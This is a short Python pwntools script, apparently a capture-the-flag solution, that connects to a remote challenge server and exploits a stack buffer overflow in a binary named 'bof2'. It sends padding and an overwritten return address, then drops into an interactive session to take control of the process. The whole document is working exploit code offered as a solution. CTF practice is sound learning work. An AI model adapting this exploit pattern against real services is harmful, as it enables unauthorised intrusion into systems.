from pwn import*
context(os='linux',arch='i386',log_level='debug')

n=remote('isc.taiwan-te.ch', 10001)
#	n=process('./bof2')


n.recvuntil('\n')

n.sendline('\x00'+'a'*0x17+p64(0x004006ac))


n.interactive()
